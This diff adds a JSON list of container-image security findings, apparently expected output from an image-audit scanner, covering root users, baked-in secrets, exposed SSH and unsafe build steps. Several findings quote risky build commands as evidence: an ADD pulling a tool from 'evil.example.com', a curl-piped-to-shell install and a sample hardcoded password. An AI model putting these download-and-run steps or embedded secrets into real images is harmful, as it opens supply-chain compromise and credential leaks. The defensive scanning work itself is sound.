@@ -1,0 +1,226 @@
+[
+  {
+    "rule_id": "DS-RAT-IMG-001",
+    "module": "imageaudit",
+    "severity": "MEDIUM",
+    "title": "Image runs as root (no USER configured)",
+    "description": "The image config declares no USER, so the container defaults to UID 0. Running as root widens the blast radius of any process compromise.",
+    "resource": "myapp:latest",
+    "remediation": "Create a non-root user in the image and set USER to its UID; verify with `docker inspect`.",
+    "references": [
+      "CIS-DI-0001",
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-002",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "No HEALTHCHECK configured in image",
+    "description": "The image config carries no HEALTHCHECK (or it is set to NONE), so runtimes cannot detect an unhealthy-but-running process.",
+    "resource": "myapp:latest",
+    "remediation": "Bake a HEALTHCHECK into the image that probes the primary process, or define one in the orchestrator.",
+    "references": [
+      "CIS-DI-0006"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-003",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "Possible secret baked into image ENV (AWS_SECRET_ACCESS_KEY)",
+    "description": "Environment variable \"AWS_SECRET_ACCESS_KEY\" looks like a credential: the variable name resembles a credential and carries a value. It is readable by anyone who can pull the image and is preserved in layer history.",
+    "resource": "myapp:latest",
+    "remediation": "Remove the secret from the image and inject it at runtime (orchestrator secret, mounted file, or vault); rotate the exposed value.",
+    "references": [
+      "CIS-DI-0010",
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-003",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "Possible secret baked into image ENV (DB_PASSWORD)",
+    "description": "Environment variable \"DB_PASSWORD\" looks like a credential: the variable name resembles a credential and carries a value. It is readable by anyone who can pull the image and is preserved in layer history.",
+    "resource": "myapp:latest",
+    "remediation": "Remove the secret from the image and inject it at runtime (orchestrator secret, mounted file, or vault); rotate the exposed value.",
+    "references": [
+      "CIS-DI-0010",
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-004",
+    "module": "imageaudit",
+    "severity": "MEDIUM",
+    "title": "Image tagged :latest",
+    "description": "The image reference myapp:latest uses the moving :latest tag; the bits behind it can change between pulls, defeating content verification.",
+    "resource": "myapp:latest",
+    "remediation": "Tag and deploy images by immutable version, ideally pinning the digest (name@sha256:...) so the running content is verifiable.",
+    "references": [
+      "CIS-DI-0005",
+      "CIS-DI-0006"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-005",
+    "module": "imageaudit",
+    "severity": "MEDIUM",
+    "title": "2 setuid binaries present",
+    "description": "The image contains 2 setuid binaries (usr/bin/passwd, usr/bin/sudo). Each runs as its file owner regardless of the invoking user, a classic privilege-escalation primitive.",
+    "resource": "myapp:latest",
+    "remediation": "Strip the setuid bit from binaries that do not need it (chmod u-s) or remove them; prefer capabilities over setuid where a privilege is genuinely required.",
+    "references": [
+      "CIS-DI-0008",
+      "MITRE-ATT\u0026CK-T1548.001"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-005",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "1 setgid binaries present",
+    "description": "The image contains 1 setgid binaries (usr/bin/wall), which run with their file group and can widen access.",
+    "resource": "myapp:latest",
+    "remediation": "Remove the setgid bit (chmod g-s) from binaries that do not require it.",
+    "references": [
+      "CIS-DI-0008"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-006",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "SSH port exposed by image",
+    "description": "The image exposes port 22 (SSH). Containers should be immutable and accessed via the orchestrator; a built-in sshd is a lateral-movement foothold and an unmanaged credential surface.",
+    "resource": "22/tcp",
+    "remediation": "Remove sshd from the image and drop the EXPOSE 22; use `kubectl exec`/`docker exec` for debugging instead.",
+    "references": [
+      "MITRE-ATT\u0026CK-T1021.004"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-006",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "Privileged port 80/tcp exposed",
+    "description": "The image exposes privileged port 80/tcp (\u003c1024). Binding it historically required root; prefer a high, unprivileged port and map it externally.",
+    "resource": "80/tcp",
+    "remediation": "Expose an unprivileged port (\u003e=1024) inside the container and remap it at the host/orchestrator layer.",
+    "references": [
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-007",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "Sensitive host path declared as VOLUME (/proc)",
+    "description": "The image declares a VOLUME at /proc, the kernel process filesystem. Persisting this as a mount point steers operators toward binding host-sensitive state into the container.",
+    "resource": "/proc",
+    "remediation": "Remove the VOLUME declaration for /proc; never mount host kernel/pseudo filesystems or the Docker socket into a container.",
+    "references": [
+      "NIST-SP-800-190",
+      "MITRE-ATT\u0026CK-T1610"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-008",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "Incomplete image provenance labels",
+    "description": "The image is missing OCI provenance annotations (org.opencontainers.image.authors, org.opencontainers.image.licenses, org.opencontainers.image.source, org.opencontainers.image.version). Without them a consumer cannot trace the running image to its source, version, and license.",
+    "resource": "myapp:latest",
+    "remediation": "Set the standard org.opencontainers.image.* labels (source, version, licenses, authors) at build time.",
+    "references": [
+      "https://github.com/opencontainers/image-spec/blob/main/annotations.md"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-009",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "Secret assigned in build history",
+    "description": "A build step assigned a credential-shaped value. Image history is readable by anyone with the image, so the secret persists even if a later layer removes it.",
+    "resource": "/bin/sh -c #(nop)  ENV DB_PASSWORD=hunter2supersecret",
+    "remediation": "Rotate the value. Inject secrets at build time with BuildKit --mount=type=secret (never ENV/ARG) and at run time via a secret store.",
+    "references": [
+      "CIS-DI-0010"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-009",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "Remote artifact fetched via ADD during build",
+    "description": "A build step used ADD with a URL, pulling unverified remote content directly into the image.",
+    "resource": "/bin/sh -c #(nop) ADD https://evil.example.com/tool /usr/local/bin/tool",
+    "remediation": "Fetch with checksum verification, or COPY a vetted local artifact.",
+    "references": [
+      "CIS-DI-0009"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-009",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "World-writable permissions set during build",
+    "description": "A build step made files world-writable (chmod 777 / a+rwx). World-writable files let any in-container user tamper with them.",
+    "resource": "/bin/sh -c chmod 777 /app/run.sh",
+    "remediation": "Grant the least permission the process needs; avoid 777.",
+    "references": [
+      "CIS-DI-0008"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-009",
+    "module": "imageaudit",
+    "severity": "MEDIUM",
+    "title": "Remote script piped into a shell during build",
+    "description": "A build step downloaded a script and executed it unverified (curl|sh) — a supply-chain injection point baked into the image lineage.",
+    "resource": "/bin/sh -c curl https://example.com/install.sh | sh",
+    "remediation": "Download to a file, verify a checksum or signature, then execute.",
+    "references": [
+      "MITRE-ATT\u0026CK-T1059"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-010",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "Package manager present in runtime image",
+    "description": "The image ships package manager(s): apt-get. In a runtime image these are attack surface — they let an attacker install tooling — and signal that build dependencies were not pruned.",
+    "resource": "myapp:latest",
+    "remediation": "Use a multi-stage build so the runtime stage carries no package manager, or switch to a distroless/minimal base.",
+    "references": [
+      "CIS-DI-0008",
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-011",
+    "module": "imageaudit",
+    "severity": "LOW",
+    "title": "Shell present in image",
+    "description": "The image contains shell(s): sh. A shell is the usual pivot for command injection and post-exploitation; shell-less (distroless) runtimes deny that primitive.",
+    "resource": "myapp:latest",
+    "remediation": "If the application does not need a shell at runtime, move to a distroless/scratch base so no shell ships in the final image.",
+    "references": [
+      "NIST-SP-800-190"
+    ]
+  },
+  {
+    "rule_id": "DS-RAT-IMG-012",
+    "module": "imageaudit",
+    "severity": "HIGH",
+    "title": "Sensitive file deleted in a later layer is still recoverable",
+    "description": "The image adds app/secret.key in one layer and removes it in a later one, but the delete is only a whiteout marker: the original bytes remain in the earlier layer and can be recovered by unpacking it.",
+    "resource": "app/secret.key",
+    "remediation": "Never add a secret to any layer. If one was committed, rebuild the image from a clean history (BuildKit secret mounts / multi-stage) and rotate the exposed credential.",
+    "references": [
+      "CIS-DI-0010",
+      "MITRE-ATT\u0026CK-T1552.001"
+    ]
+  }
+]
